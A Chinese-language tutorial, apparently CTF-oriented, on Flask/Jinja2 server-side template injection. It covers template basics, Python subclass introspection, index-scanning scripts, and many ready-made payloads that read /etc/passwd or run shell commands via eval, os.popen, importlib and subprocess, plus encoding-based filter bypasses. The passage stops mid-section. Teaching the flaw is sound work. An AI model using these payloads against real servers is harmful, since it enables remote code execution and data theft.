0x00 SSTI简介
===========

SSTI就是服务器端模板注入(Server-Side Template Injection)。SSTI也是注入类的漏洞，其成因其实是可以类比于sql注入的。

sql注入是从用户获得一个输入，然后由后端脚本语言进行数据库查询，所以可以利用输入来拼接我们想要的sql语句，当然现在的sql注入防范做得已经很好了，然而随之而来的是更多的漏洞。

SSTI也是获取了一个输入，然后在后端的渲染处理上进行了语句的拼接，然后执行。当然还是和sql注入有所不同的，SSTI利用的是现在的网站模板引擎，模板引擎（这里特指用于Web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，用于网站的模板引擎就会生成一个标准的HTML文档，主要针对python、php、java的一些网站处理框架，比如Python的`jinja2`、`mako`、`tornado`、`django`，php的`smarty`、`twig`，java的`jade`、`velocity`。当这些框架对运用渲染函数生成html的时候，有时就会出现SSTI的问题。

目前所做的题目里，大部分都是python的模板引擎，其中最多的是`flask-jinja2`，这也是我们本文要详细解读的模板引擎。

flask框架的简单使用
------------

### flask框架的安装

Flask 是一个用 Python 实现的 Web 应用框架，我们可以通过`pip`命令直接安装。

在安装 Flask 的过程中，其所依赖的包 Werkzeug 也被自动安装，Werkzeug 会完成底层的网络连接功能，下面是一个简单的通过Werkzeug 来实现最简单的 Web 服务功能的示例。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-cb7e3031f24ca41c2986a5ac290260dfed3412f0.png)

我们还可以尝试直接使用flask创建一个简单的应用程序。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-9a86211c9b00a1b5252479046c2986de05b77b4a.png)

我们接下来学习一下里面的几个知识点。

### 路由

我们可以看到，我们上面的两个示例都用到了`@`开头的一串代码，比如flask应用中的`@app1.route('/')`，我们给出的注释是 `给app1添加处理函数，其对于URL是/` ，这里涉及到一个**路由**的概念，app1 是我们创建的应用对象，**/ 就是路由**，表示如果用户输入了这个地址，那么 Flask 就会调用对应的 demo1() 函数来进行处理。

路由分为静态路由和动态路由，静态路由就是上面的这种了，而动态路由则可以使用变量来代替部分路由地址，在设置动态路由的时候还可以定义类型。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-26b8fcb7c7018d7edf6c298206e148a971d77a11.png)

### 模板

flask是使用Jinja2来作为**渲染引擎**的，模板文件并不是单纯的html代码，而是夹杂着模板的语法，因为页面不可能都是一个样子的，有一些地方是会变化的。比如说显示用户名的地方，这个时候就需要使用模板支持的语法，来传参。

Jinja2：是Python下一个被广泛应用的模板引擎,是由Python实现的**模板语言**,他的设计思想来源于Django的模板引擎,并扩展了其语法和一系列强大的功能,其是Flask内置的模板语言

模板语言：是一种被设计来自动生成文档的简单文本格式,在模板语言中,一般都会把一些**变量传给模板**，**替换模板的特定位置上预先定义好的占位变量名**

### 渲染模板函数

flask的渲染方法有`render_template`。

- Flask提供的`render_template`函数封装了该模板引擎
- `render_template`函数的第一个参数是模板的文件名,后面的参数都是键值对,表示模板中变量对应的真实值

使用如下

1. `{{}}`来表示变量名,这种{{}}语法叫做**变量代码块**

```python
<h1>{{post.title}}</h1>
```

Jinja2模板中的变量代码块可以是任意Python类型或者对象，只要它能够被Python的`str()`方法转化为一个字符串就可以，比如，可以通过下面的方式显示一个字典或者列表中的某个元素

```python
{{your_dict['key']}}
{{your_list[0]}}
```

2. 用{%%}定义的控制代码块，可以实现一些语言层次的功能，比如循环语句

```python
{% if user %}
    {{ user }}
{% else %}
    hello!
<ul>
    {% for index in indexs %}
    <li> {{ index }} </li>
    {% endfor %}
</ul>
```

3. 使用{##}进行注释,注释的内容不会在html中被渲染出来

```html
{#{{ name }}#}
```

还有一个`render_template_string`则是用来渲染一个字符串的。SSTI与这个方法密不可分。

```python
html = '<h1>This is index page</h1>'
return render_template_string(html)
```

不正确的使用渲染模板函数就会引发SSTI

0x01 漏洞产生
=========

我们可以来看一下这里是怎么产生的漏洞。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-e8411ec1d39f11f9a3e5e3e6299829cca3a1120c.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-115d0038cb2b656719147fe588f3cf410dbc9536.png)

`render_template_string`函数在渲染模板的时候使用了`%s`来动态的替换字符串，且code是可控的，因为flask是基于jinja2的，Jinja2在渲染的时候会把`{{}}`包裹的内容当做变量解析替换。所以可以利用此语法，传入参数{{7\*7}}会发现返回值为49，说明我们输入的表达式被执行了。这里只是最简单的一种情况的演示，还有其他的情况会导致SSTI注入漏洞，但是都是换汤不换药。

当然这里因为写的不太规范还存在一个XSS漏洞，这不是我们要研究的重点，先忽略一下吧。

0x02漏洞利用
========

SSTI漏洞的利用就相对来说复杂很多了，它牵扯到了python的内置类。

python之类之魔神
-----------

面向对象语言的方法来自于类，对于python，有很多好用的函数库，我们经常会再写Python中用到import来引入许多的类和方法，python的str(字符串)、dict(字典)、tuple(元组)、list(列表)这些在Python类结构的基类都是 **object** ，而object拥有众多的子类。

这里要注意，python2和python3以及各个版本、不同环境之下，回到基类的方法和子类的索引是不一样的，要**学会脚本的使用**，查找需要的子类，注意**分析当前环境**是python2还是python3。

- `__class__`：用来查看变量所属的类，根据前面的变量形式可以得到其所属的类。 `__class__` 是类的一个内置属性，表示类的类型，返回 `<type 'type'>` ； 也是类的实例的属性，表示实例对象的类。

```python
Python 3.9.2 (tags/v3.9.2:1a79785, Feb 19 2021, 13:44:55) [MSC v.1928 64 bit (AMD64)] on win32
Type "help", "copyright", "credits" or "license" for more information.
>>> ''.__class__
<class 'str'>
>>> ().__class__
<class 'tuple'>
>>> [].__class__
<class 'list'>
>>> {}.__class__
<class 'dict'>

Python 2.7.18 (v2.7.18:8d21aa21f2, Apr 20 2020, 13:25:05) [MSC v.1500 64 bit (AMD64)] on win32
Type "help", "copyright", "credits" or "license" for more information.
>>> ''.__class__
<type 'str'>
>>> [].__class__
<type 'list'>
>>> {}.__class__
<type 'dict'>
>>> ().__class__
<type 'tuple'>
```

- `__bases__`：用来查看类的基类，也可以使用数组索引来查看特定位置的值。 通过该属性可以查看该类的所有**直接父类**，该属性返回所有直接父类组成的 **元组** （虽然只有一个元素）。

```python
Python 3.9.2 (tags/v3.9.2:1a79785, Feb 19 2021, 13:44:55) [MSC v.1928 64 bit (AMD64)] on win32
Type "help", "copyright", "credits" or "license" for more information.
>>> ''.__class__.__bases__
(<class 'object'>,)
>>> ().__class__.__bases__
(<class 'object'>,)
>>> [].__class__.__bases__
(<class 'object'>,)
>>> {}.__class__.__bases__
(<class 'object'>,)

#可以发现，python2下用bases以及base不是全能回到基类的
Python 2.7.18 (v2.7.18:8d21aa21f2, Apr 20 2020, 13:25:05) [MSC v.1500 64 bit (AMD64)] on win32
Type "help", "copyright", "credits" or "license" for more information.
>>> ''.__class__.__bases__
(<type 'basestring'>,)
>>> ''.__class__.__bases__[0]
<type 'basestring'>
>>> ''.__class__.__bases__[-1]
<type 'basestring'>
>>> [].__class__.__bases__[-1]
<type 'object'>
>>> {}.__class__.__bases__[-1]
<type 'object'>
>>> ().__class__.__bases__[-1]
<type 'object'>
```

- 获取基类还能用 `__mro__` 方法，`__mro__` 方法可以用来获取一个类的调用顺序，比如

```python
Python 3.9.2 (tags/v3.9.2:1a79785, Feb 19 2021, 13:44:55) [MSC v.1928 64 bit (AMD64)] on win32
Type "help", "copyright", "credits" or "license" for more information.
>>> ''.__class__.__mro__
(<class 'str'>, <class 'object'>)
>>> ''.__class__.__mro__[0]
<class 'str'>
>>> ''.__class__.__mro__[1]  #使用索引就可以直接返回基类了
<class 'object'>
#python2下的mro索引的设置也要注意
Python 2.7.18 (v2.7.18:8d21aa21f2, Apr 20 2020, 13:25:05) [MSC v.1500 64 bit (AMD64)] on win32
Type "help", "copyright", "credits" or "license" for more information.
>>> ''.__class__.__mro__
(<type 'str'>, <type 'basestring'>, <type 'object'>)
>>> ''.__class__.__mro__[0]
<type 'str'>
>>> ''.__class__.__mro__[1]
<type 'basestring'>
>>> ''.__class__.__mro__[2]
<type 'object'>
>>> ''.__class__.__mro__[-1]
<type 'object'>
>>> [].__class__.__mro__
(<type 'list'>, <type 'object'>)
>>> [].__class__.__mro__[0]
<type 'list'>
>>> [].__class__.__mro__[1]
<type 'object'>
>>> [].__class__.__mro__[-1]
<type 'object'>
#其他的自行尝试
```

- 除此之外，我们还可以利用 `__base__` 方法获取直接基类

```python
Python 3.9.2 (tags/v3.9.2:1a79785, Feb 19 2021, 13:44:55) [MSC v.1928 64 bit (AMD64)] on win32
Type "help", "copyright", "credits" or "license" for more information.
>>> ''.__class__.__base__
<class 'object'>
#python2下又不都能
Python 2.7.18 (v2.7.18:8d21aa21f2, Apr 20 2020, 13:25:05) [MSC v.1500 64 bit (AMD64)] on win32
Type "help", "copyright", "credits" or "license" for more information.
>>> ''.__class__.__base__
<type 'basestring'>
>>> [].__class__.__base__
<type 'object'>
>>> {}.__class__.__base__
<type 'object'>
>>> ().__class__.__base__
<type 'object'>
```

有这些类继承的方法，我们就可以从任何一个变量，回溯到最顶层基类（`<class'object'>`）中去，再获得到此基类所有实现的类，就可以获得到很多的类和方法了。

**这里有很多和python沙盒逃逸重合的部分。**

- `__subclasses__()`：查看当前类的子类组成的列表，即返回基类object的子类。

```python
Python 3.9.2 (tags/v3.9.2:1a79785, Feb 19 2021, 13:44:55) [MSC v.1928 64 bit (AMD64)] on win32
Type "help", "copyright", "credits" or "license" for more information.
>>> ''.__class__.__bases__
(<class 'object'>,)
>>> ''.__class__.__bases__[0]
<class 'object'>
>>> ''.__class__.__bases__.__subclasses__()
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
AttributeError: 'tuple' object has no attribute '__subclasses__' #这里有点小蒙，刚刚明明看到了显示出来的就是object类
>>> ''.__class__.__bases__[0].__subclasses__()
[<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, <class 'weakproxy'>, <class 'int'>, <class 'bytearray'>, <class 'bytes'>, <class 'list'>, <class 'NoneType'>, <class 'NotImplementedType'>, <class 'traceback'>, <class 'super'>, <class 'range'>, <class 'dict'>, <class 'dict_keys'>, <class 'dict_values'>, <class 'dict_items'>, <class 'dict_reversekeyiterator'>, <class 'dict_reversevalueiterator'>, <class 'dict_reverseitemiterator'>, <class 'odict_iterator'>, <class 'set'>, <class 'str'>, <class 'slice'>, <class 'staticmethod'>, <class 'complex'>, <class 'float'>, <class 'frozenset'>, <class 'property'>, <class 'managedbuffer'>, <class 'memoryview'>, <class 'tuple'>, <class 'enumerate'>, <class 'reversed'>, <class 'stderrprinter'>, <class 'code'>, <class 'frame'>, <class 'builtin_function_or_method'>, <class 'method'>, <class 'function'>, <class 'mappingproxy'>, <class 'generator'>, <class 'getset_descriptor'>, <class 'wrapper_descriptor'>, <class 'method-wrapper'>, <class 'ellipsis'>, <class 'member_descriptor'>, <class 'types.SimpleNamespace'>, <class 'PyCapsule'>, <class 'longrange_iterator'>, <class 'cell'>, <class 'instancemethod'>, <class 'classmethod_descriptor'>, <class 'method_descriptor'>, <class 'callable_iterator'>, <class 'iterator'>, <class 'pickle.PickleBuffer'>, <class 'coroutine'>, <class 'coroutine_wrapper'>, <class 'InterpreterID'>, <class 'EncodingMap'>, <class 'fieldnameiterator'>, <class 'formatteriterator'>, <class 'BaseException'>, <class 'hamt'>, <class 'hamt_array_node'>, <class 'hamt_bitmap_node'>, <class 'hamt_collision_node'>, <class 'keys'>, <class 'values'>, <class 'items'>, <class 'Context'>, <class 'ContextVar'>, <class 'Token'>, <class 'Token.MISSING'>, <class 'moduledef'>, <class 'module'>, <class 'filter'>, <class 'map'>, <class 'zip'>, <class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib.BuiltinImporter'>, <class 'classmethod'>, <class '_frozen_importlib.FrozenImporter'>, <class '_frozen_importlib._ImportLockContext'>, <class '_thread._localdummy'>, <class '_thread._local'>, <class '_thread.lock'>, <class '_thread.RLock'>, <class '_frozen_importlib_external.WindowsRegistryFinder'>, <class '_frozen_importlib_external._LoaderBasics'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.PathFinder'>, <class '_frozen_importlib_external.FileFinder'>, <class 'nt.ScandirIterator'>, <class 'nt.DirEntry'>, <class '_io._IOBase'>, <class '_io._BytesIOBuffer'>, <class '_io.IncrementalNewlineDecoder'>, <class 'PyHKEY'>, <class 'zipimport.zipimporter'>, <class 'zipimport._ZipImportResourceReader'>, <class 'codecs.Codec'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class 'MultibyteCodec'>, <class 'MultibyteIncrementalEncoder'>, <class 'MultibyteIncrementalDecoder'>, <class 'MultibyteStreamReader'>, <class 'MultibyteStreamWriter'>, <class '_abc._abc_data'>, <class 'abc.ABC'>, <class 'dict_itemiterator'>, <class 'collections.abc.Hashable'>, <class 'collections.abc.Awaitable'>, <class 'types.GenericAlias'>, <class 'collections.abc.AsyncIterable'>, <class 'async_generator'>, <class 'collections.abc.Iterable'>, <class 'bytes_iterator'>, <class 'bytearray_iterator'>, <class 'dict_keyiterator'>, <class 'dict_valueiterator'>, <class 'list_iterator'>, <class 'list_reverseiterator'>, <class 'range_iterator'>, <class 'set_iterator'>, <class 'str_iterator'>, <class 'tuple_iterator'>, <class 'collections.abc.Sized'>, <class 'collections.abc.Container'>, <class 'collections.abc.Callable'>, <class 'os._wrap_close'>, <class 'os._AddedDllDirectory'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class '_sitebuiltins._Helper'>]
```

可以看到爆出来了很多很多的子类，不方便我们查阅以及以后的利用

```python
#python2
for i in enumerate(''.__class__.__mro__[-1].__subclasses__()):  #这里是python2下的，python2中的类的使用和python3中的略有不同
    print i

得到结果：
(0, <type 'type'>)
(1, <type 'weakref'>)
(2, <type 'weakcallableproxy'>)
(3, <type 'weakproxy'>)
(4, <type 'int'>)
(5, <type 'basestring'>)
(6, <type 'bytearray'>)
(7, <type 'list'>)
(8, <type 'NoneType'>)
(9, <type 'NotImplementedType'>)
(10, <type 'traceback'>)
(11, <type 'super'>)
(12, <type 'xrange'>)
(13, <type 'dict'>)
(14, <type 'set'>)
(15, <type 'slice'>)
(16, <type 'staticmethod'>)
(17, <type 'complex'>)
(18, <type 'float'>)
(19, <type 'buffer'>)
(20, <type 'long'>)
(21, <type 'frozenset'>)
(22, <type 'property'>)
(23, <type 'memoryview'>)
(24, <type 'tuple'>)
(25, <type 'enumerate'>)
(26, <type 'reversed'>)
(27, <type 'code'>)
(28, <type 'frame'>)
(29, <type 'builtin_function_or_method'>)
(30, <type 'instancemethod'>)
(31, <type 'function'>)
(32, <type 'classobj'>)
(33, <type 'dictproxy'>)
(34, <type 'generator'>)
(35, <type 'getset_descriptor'>)
(36, <type 'wrapper_descriptor'>)
(37, <type 'instance'>)
(38, <type 'ellipsis'>)
(39, <type 'member_descriptor'>)
(40, <type 'file'>)
(41, <type 'PyCapsule'>)
(42, <type 'cell'>)
(43, <type 'callable-iterator'>)
(44, <type 'iterator'>)
(45, <type 'sys.long_info'>)
(46, <type 'sys.float_info'>)
(47, <type 'EncodingMap'>)
(48, <type 'fieldnameiterator'>)
(49, <type 'formatteriterator'>)
(50, <type 'sys.version_info'>)
(51, <type 'sys.flags'>)
(52, <type 'sys.getwindowsversion'>)
(53, <type 'exceptions.BaseException'>)
(54, <type 'module'>)
(55, <type 'imp.NullImporter'>)
(56, <type 'zipimport.zipimporter'>)
(57, <type 'nt.stat_result'>)
(58, <type 'nt.statvfs_result'>)
(59, <class 'warnings.WarningMessage'>)
(60, <class 'warnings.catch_warnings'>)
(61, <class '_weakrefset._IterationGuard'>)
(62, <class '_weakrefset.WeakSet'>)
(63, <class '_abcoll.Hashable'>)
(64, <type 'classmethod'>)
(65, <class '_abcoll.Iterable'>)
(66, <class '_abcoll.Sized'>)
(67, <class '_abcoll.Container'>)
(68, <class '_abcoll.Callable'>)
(69, <type 'dict_keys'>)
(70, <type 'dict_items'>)
(71, <type 'dict_values'>)
(72, <class 'site._Printer'>)
(73, <class 'site._Helper'>)
(74, <class 'site.Quitter'>)
(75, <class 'codecs.IncrementalEncoder'>)
(76, <class 'codecs.IncrementalDecoder'>)
(77, <type '_sre.SRE_Pattern'>)
(78, <type '_sre.SRE_Match'>)
(79, <type '_sre.SRE_Scanner'>)
(80, <type 'operator.itemgetter'>)
(81, <type 'operator.attrgetter'>)
(82, <type 'operator.methodcaller'>)
(83, <type 'functools.partial'>)
(84, <type 'MultibyteCodec'>)
(85, <type 'MultibyteIncrementalEncoder'>)
(86, <type 'MultibyteIncrementalDecoder'>)
(87, <type 'MultibyteStreamReader'>)
(88, <type 'MultibyteStreamWriter'>)
```

```python
#python3
for i in enumerate(''.__class__.__bases__[0].__subclasses__()):  #这是python3的，和我们刚刚命令行里跑的一样
    print(i)

得到结果：

(0, <class 'type'>)
(1, <class 'weakref'>)
(2, <class 'weakcallableproxy'>)
(3, <class 'weakproxy'>)
(4, <class 'int'>)
(5, <class 'bytearray'>)
(6, <class 'bytes'>)
(7, <class 'list'>)
(8, <class 'NoneType'>)
(9, <class 'NotImplementedType'>)
(10, <class 'traceback'>)
(11, <class 'super'>)
(12, <class 'range'>)
(13, <class 'dict'>)
(14, <class 'dict_keys'>)
(15, <class 'dict_values'>)
(16, <class 'dict_items'>)
(17, <class 'dict_reversekeyiterator'>)
(18, <class 'dict_reversevalueiterator'>)
(19, <class 'dict_reverseitemiterator'>)
(20, <class 'odict_iterator'>)
(21, <class 'set'>)
(22, <class 'str'>)
(23, <class 'slice'>)
(24, <class 'staticmethod'>)
(25, <class 'complex'>)
(26, <class 'float'>)
(27, <class 'frozenset'>)
(28, <class 'property'>)
(29, <class 'managedbuffer'>)
(30, <class 'memoryview'>)
(31, <class 'tuple'>)
(32, <class 'enumerate'>)
(33, <class 'reversed'>)
(34, <class 'stderrprinter'>)
(35, <class 'code'>)
(36, <class 'frame'>)
(37, <class 'builtin_function_or_method'>)
(38, <class 'method'>)
(39, <class 'function'>)
(40, <class 'mappingproxy'>)
(41, <class 'generator'>)
(42, <class 'getset_descriptor'>)
(43, <class 'wrapper_descriptor'>)
(44, <class 'method-wrapper'>)
(45, <class 'ellipsis'>)
(46, <class 'member_descriptor'>)
(47, <class 'types.SimpleNamespace'>)
(48, <class 'PyCapsule'>)
(49, <class 'longrange_iterator'>)
(50, <class 'cell'>)
(51, <class 'instancemethod'>)
(52, <class 'classmethod_descriptor'>)
(53, <class 'method_descriptor'>)
(54, <class 'callable_iterator'>)
(55, <class 'iterator'>)
(56, <class 'pickle.PickleBuffer'>)
(57, <class 'coroutine'>)
(58, <class 'coroutine_wrapper'>)
(59, <class 'InterpreterID'>)
(60, <class 'EncodingMap'>)
(61, <class 'fieldnameiterator'>)
(62, <class 'formatteriterator'>)
(63, <class 'BaseException'>)
(64, <class 'hamt'>)
(65, <class 'hamt_array_node'>)
(66, <class 'hamt_bitmap_node'>)
(67, <class 'hamt_collision_node'>)
(68, <class 'keys'>)
(69, <class 'values'>)
(70, <class 'items'>)
(71, <class 'Context'>)
(72, <class 'ContextVar'>)
(73, <class 'Token'>)
(74, <class 'Token.MISSING'>)
(75, <class 'moduledef'>)
(76, <class 'module'>)
(77, <class 'filter'>)
(78, <class 'map'>)
(79, <class 'zip'>)
(80, <class '_frozen_importlib._ModuleLock'>)
(81, <class '_frozen_importlib._DummyModuleLock'>)
(82, <class '_frozen_importlib._ModuleLockManager'>)
(83, <class '_frozen_importlib.ModuleSpec'>)
(84, <class '_frozen_importlib.BuiltinImporter'>)
(85, <class 'classmethod'>)
(86, <class '_frozen_importlib.FrozenImporter'>)
(87, <class '_frozen_importlib._ImportLockContext'>)
(88, <class '_thread._localdummy'>)
(89, <class '_thread._local'>)
(90, <class '_thread.lock'>)
(91, <class '_thread.RLock'>)
(92, <class '_frozen_importlib_external.WindowsRegistryFinder'>)
(93, <class '_frozen_importlib_external._LoaderBasics'>)
(94, <class '_frozen_importlib_external.FileLoader'>)
(95, <class '_frozen_importlib_external._NamespacePath'>)
(96, <class '_frozen_importlib_external._NamespaceLoader'>)
(97, <class '_frozen_importlib_external.PathFinder'>)
(98, <class '_frozen_importlib_external.FileFinder'>)
(99, <class 'nt.ScandirIterator'>)
(100, <class 'nt.DirEntry'>)
(101, <class '_io._IOBase'>)
(102, <class '_io._BytesIOBuffer'>)
(103, <class '_io.IncrementalNewlineDecoder'>)
(104, <class 'PyHKEY'>)
(105, <class 'zipimport.zipimporter'>)
(106, <class 'zipimport._ZipImportResourceReader'>)
(107, <class 'codecs.Codec'>)
(108, <class 'codecs.IncrementalEncoder'>)
(109, <class 'codecs.IncrementalDecoder'>)
(110, <class 'codecs.StreamReaderWriter'>)
(111, <class 'codecs.StreamRecoder'>)
(112, <class '_abc._abc_data'>)
(113, <class 'abc.ABC'>)
(114, <class 'dict_itemiterator'>)
(115, <class 'collections.abc.Hashable'>)
(116, <class 'collections.abc.Awaitable'>)
(117, <class 'types.GenericAlias'>)
(118, <class 'collections.abc.AsyncIterable'>)
(119, <class 'async_generator'>)
(120, <class 'collections.abc.Iterable'>)
(121, <class 'bytes_iterator'>)
(122, <class 'bytearray_iterator'>)
(123, <class 'dict_keyiterator'>)
(124, <class 'dict_valueiterator'>)
(125, <class 'list_iterator'>)
(126, <class 'list_reverseiterator'>)
(127, <class 'range_iterator'>)
(128, <class 'set_iterator'>)
(129, <class 'str_iterator'>)
(130, <class 'tuple_iterator'>)
(131, <class 'collections.abc.Sized'>)
(132, <class 'collections.abc.Container'>)
(133, <class 'collections.abc.Callable'>)
(134, <class 'os._wrap_close'>)
(135, <class 'os._AddedDllDirectory'>)
(136, <class '_sitebuiltins.Quitter'>)
(137, <class '_sitebuiltins._Printer'>)
(138, <class '_sitebuiltins._Helper'>)
```

然后我们要做的就是积累一些可以利用的类了，比如python2中的file类可以直接用来读取文件，同时注意python2和python3的区别，可以看到，python3中已经不存在了，我们可以用`<class '_frozen_importlib_external.FileLoader'>` 这个类去读取文件。

```python
{{[].__class__.__base__.__subclasses__()[40]('/etc/passwd').read()}}
{{().__class__.__bases__[0].__subclasses__()[94]["get_data"](0, "/etc/passwd")}}
```

python3的版本不同，要利用的类的位置就不同，索引号就不同，我们需要编写一下遍历python环境中类的脚本：

```python
import requests

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36'
}
#http请求头，可以用抓包工具抓一份自己的。
for i in range(500):
    url = "http://xxx.xxx.xxx.xxx:xxxx/?get参数={{().__class__.__bases__[0].__subclasses__()["+str(i)+"]}}"

    res = requests.get(url=url,headers=headers)
    if 'FileLoader' in res.text: #以FileLoader为例
        print(i)

# 得到编号为79
```

```python
import requests

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36'
}
#http请求头，可以用抓包工具抓一份自己的。
for i in range(500):
    url = "http://xxx.xxx.xxx.xxx:xxxx/"
    postPara = {"post参数":"{{().__class__.__bases__[0].__subclasses__()["+str(i)+"]}}"}
    res = requests.post(url=url,headers=headers,data=postPara)
    if 'FileLoader' in res.text: #以FileLoader为例，查找其他命令时就用其他子类
        print(i)

# 得到编号为79
```

常用的子类
-----

执行命令的子类

- 可以用来执行命令的类有很多，其基本原理就是**遍历含有eval函数即os模块的子类**，利用这些子类中的eval函数即os模块执行命令。

### 寻找内建函数 eval 执行命令

编写遍历脚本查找含有**eval**的类

编写的思路很简单，大家最好可以做到手动编写，首先是要对python的`requests`库进行一个学习，了解这个库怎么设置参数，怎么确定的请求方式，在这个基础上就只需要设置一个for循环和一个if判断就可以了。

可以记一下几个含有eval函数的类：

- warnings.catch\_warnings
- WarningMessage
- codecs.IncrementalEncoder
- codecs.IncrementalDecoder
- codecs.StreamReaderWriter
- os.\_wrap\_close
- reprlib.Repr
- weakref.finalize
- etc.

所以payload如下：

```python
{{''.__class__.__bases__[0].__subclasses__()[166].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()')}}+
```

### 寻找 os 模块执行命令

Python的 os 模块中有system和popen这两个函数可用来执行命令。其中`system()`函数执行命令是没有回显的，我们可以使用system()函数配合curl外带数据；`popen()`函数执行命令有回显。所以比较常用的函数为`popen()`函数，而当`popen()`函数被过滤掉时，可以使用`system()`函数代替。

首先编写脚本遍历目标Python环境中含有**os**模块的类的索引号

随便挑一个类构造payload执行命令即可：

```python
{{''.__class__.__bases__[0].__subclasses__()[79].__init__.__globals__['os'].popen('ls /').read()}} 
```

但是该方法遍历得到的类不准确，因为一些不相关的类名中也存在字符串 “os”，所以我们还要探索更有效的方法。

我们可以看到，即使是使用os模块执行命令，其也是调用的os模块中的popen函数，那我们也可以直接调用popen函数，存在popen函数的类一般是 `os._wrap_close`，但也不绝对。**由于目标Python环境的不同，我们还需要遍历一下。**

### 寻找 popen 函数执行命令

首先编写脚本遍历目标Python环境中含有 **popen** 函数的类的索引号

直接构造payload即可：

```python
{{''.__class__.__bases__[0].__subclasses__()[117].__init__.__globals__['popen']('ls /').read()}}
```

### 寻找 importlib 类执行命令

除了上面的方法外，我们还可以直接导入os模块，python有一个importlib类，可用load\_module来导入你需要的模块。

Python 中存在 `<class '_frozen_importlib.BuiltinImporter'>` 类，目的就是提供 Python 中 import 语句的实现（以及 `__import__` 函数）。我么可以直接利用该类中的load\_module将os模块导入，从而使用 os 模块执行命令。

首先编写脚本遍历目标Python环境中 **importlib** 类的索引号

构造如下payload即可执行命令：

```python
{{[].__class__.__base__.__subclasses__()[69]["load_module"]("os")["popen"]("ls /").read()}}
```

### 寻找 linecache 函数执行命令

linecache 这个函数可用于读取任意一个文件的某一行，而这个函数中也引入了 os 模块，所以我们也可以利用这个 linecache 函数去执行命令。

首先编写脚本遍历目标Python环境中含有 **linecache** 这个函数的子类的索引号

随便挑一个子类构造payload即可：

```python
{{[].__class__.__base__.__subclasses__()[168].__init__.__globals__.linecache.os.popen('ls /').read()}}
{{[].__class__.__base__.__subclasses__()[168].__init__.__globals__['linecache']['os'].popen('ls /').read()}}
```

### 寻找 subprocess.Popen 类执行命令

从python2.4版本开始，可以用 **subprocess** 这个模块来产生子进程，并连接到子进程的标准输入/输出/错误中去，还可以得到子进程的返回值。

subprocess 意在替代其他几个老的模块或者函数，比如：`os.system`、`os.popen` 等函数。

**查找subprocess索引**

则构造如下payload执行命令即可：

```python
{{[].__class__.__base__.__subclasses__()[245]('ls /',shell=True,stdout=-1).communicate()[0].strip()}}  
# {{[].__class__.__base__.__subclasses__()[245]('要执行的命令',shell=True,stdout=-1).communicate()[0].strip()}}
```

0x03 绕过！
========

关键字绕过
-----

### 拼接绕过

我们可以利用“+”进行字符串拼接，绕过关键字过滤

但是往往这种绕过需要一定的条件，返回的要是**字典类型**的或是**字符串格式**的，即payload中**引号内**的，在调用的时候才可以使用字符串拼接绕过，我们要学会怎么把被过滤的命令放在能拼接的地方。

```python
{{().__class__.__bases__[0].__subclasses__()[40]('/fl'+'ag').read()}}

{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("o"+"s").popen("ls /").read()')}}

{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__buil'+'tins__']['eval']('__import__("os").popen("ls /").read()')}}
```

### 利用编码绕过

#### base64编码

我们可以利用对关键字编码的方法，绕过关键字过滤，例如用base64编码绕过：

```python
{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['X19idWlsdGluc19f'.decode('base64')]['ZXZhbA=='.decode('base64')]('X19pbXBvcnRfXygib3MiKS5wb3BlbigibHMgLyIpLnJlYWQoKQ=='.decode('base64'))}}
```

等同于：

```python
{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()')}}
```

可以看到，在payload中，只要是字符串的，即payload中引号内的，都可以用编码绕过。同理还可以进行rot13等。这一切都是基于我们可以执行命令实现的。

#### 利用Unicode编码绕过关键字（flask适用）

我们可以利用unicode编码的方法，绕过关键字过滤，例如：

```python
{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f']['\u0065\u0076\u0061\u006c']('__import__("os").popen("ls /").read()')}}

{{().__class__.__base__.__subclasses__()[77].__init__.__globals__['\u006f\u0073'].popen('\u006c\u0073\u0020\u002f').read()}}
```

等同于：

```python
{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()')}}

{{().__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].popen('ls /').read()}}
```

可以看到，我们用eval时几乎所有命令都是再引号下的，我们这一手**几乎**可以通杀，几乎哈

#### 利用Hex编码绕过关键字

和上面那个一样，只不过将Unicode编码换成了Hex编码，适用于过滤了“u”的情况。

我们可以利用hex编码的方法，绕过关键字过滤，例如：

```python
{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f']['\x65\x76\x61\x6c']('__import__("os").popen("ls /").read()')}}

{{().__class__.__base__.__subclasses__()[77].__init__.__globals__['\x6f\x73'].popen('\x6c\x73\x20\x2f').read()}}
```

等同于

```python
